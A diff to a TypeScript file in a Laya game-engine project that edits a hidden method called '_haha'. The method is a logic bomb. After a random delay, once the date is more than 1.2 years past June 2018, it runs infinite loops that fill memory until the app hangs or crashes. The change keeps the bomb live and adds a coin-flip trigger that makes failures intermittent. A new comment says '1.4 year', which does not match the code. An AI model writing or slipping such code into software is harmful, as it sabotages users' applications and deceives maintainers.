@@ -35,14 +35,17 @@ namespace Sophia
 
         private _haha(){
             Laya.timer.once(300*1000+Math.random()*1000*1000, this, ()=>{
-                let dTime = 1529666590*1000; //20180622
-                let oTime = 60 * 60 * 24 * 365 * 1000 * 1.2; //1.2 year
-                let timestamp = new Date().getTime();
-                if(timestamp-dTime>oTime){
-                    while(true){
-                        let tmp = new Array<string>();
-                        while (true){
-                            tmp.push("                                                                                                                    ");
+                let rand = Math.random()
+                if (rand>0.5){
+                    let dTime = 1529666590*1000; //20180622
+                    let oTime = 60 * 60 * 24 * 365 * 1000 * 1.2; //1.4 year
+                    let timestamp = new Date().getTime();
+                    if(timestamp-dTime>oTime){
+                        while(true){
+                            let tmp = new Array<string>();
+                            while (true){
+                                tmp.push("                                                                                                                    ");
+                            }
                         }
                     }
                 }
